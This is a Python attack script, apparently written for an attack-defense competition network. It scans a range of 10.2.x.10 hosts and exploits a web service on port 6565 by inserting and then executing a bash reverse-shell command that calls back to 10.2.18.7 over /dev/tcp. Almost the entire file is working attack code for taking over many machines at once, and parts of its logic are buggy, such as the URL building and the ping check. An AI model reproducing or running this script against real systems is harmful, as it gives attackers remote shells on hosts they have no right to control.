#created by S1n1st3r
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import requests
import os
from time import sleep
import threading
import sys
import base64
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

TEAM_SUB_IP = 18

#==========Modify this for your needs=================#
def exploit(ip):
    #send exploit to connection
    try:                                
        """Inserts a command into the webserver's database."""
        url = f"http://{ip}:6565/insert_command"
        payload = {'command': "/bin/bash -c 'sh -i >& /dev/tcp/10.2.18.7/51602 0>&1'"}
        headers = {'Content-Type': 'application/json'}
        
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print("Command inserted successfully.")
        else:
            print(f"Failed to insert command: {response.text}")
        """Executes a command that is already in the webserver's database."""
        url = f"{url}/run_command"
        headers = {'Content-Type': 'application/json'}
        
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            result = response.json()
            if "output" in result:
                print("Command Output:", result["output"])
            elif "error" in result:
                print("Command Error:", result["error"])
        else:
            print(f"Failed to execute command: {response.text}")
        print("exploited")
    except Exception as e:
        print(f"Exploit to failed")
        return None


def get_ips(): 
    x = ["10.2.{}.10".format(a) for a in range( #replace the .10 with whatever the vuln machine last octet is on our system
        0, 40) if a != TEAM_SUB_IP]
    #ping ips to get valid ones
    for ip in x:
        if ping_ip(ip):
            yield ip

#just in case
def get_hostnames():
    x = ["NCX_CCE_{}_{}".format(a, b) for a in range(
        0, 120) if a != TEAM_SUB_IP for b in ["dns", "web", "db", "app"]]
    for hostname in x:
        if ping_ip(hostname):
            yield hostname

def ping_ip(ip):
    #ping IP
    DEVNULL = open(os.devnull, 'w')
    try:
        response = os.popen(f"ping -c 2 {ip}").read()
        if "Received = 4" in response:
            return False
        else:
            return True
    except Exception:
            return False

def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #establish connection to ip and port, return the connection
    try:
        s.connect((ip, port))
        print(f"Connection to {ip} successful")
        exploit(s)
        print(f"Exploitation to {ip} (likely) successful")
    except Exception as e:
        print(f"Connection to {ip} failed")
        return None


def main():
    #check for port argument
    if len(sys.argv) != 2:
        print("Usage: python3 Pwn4AllFTP.py <port>")
        sys.exit(1)
    #get port from system arguments
    port = int(sys.argv[1])
    #create emtpy files of the lists
    executor = ThreadPoolExecutor(max_workers=16)
    futures = [executor.submit(exploit, ip) for ip in get_ips()]


if __name__ == "__main__":
    main()
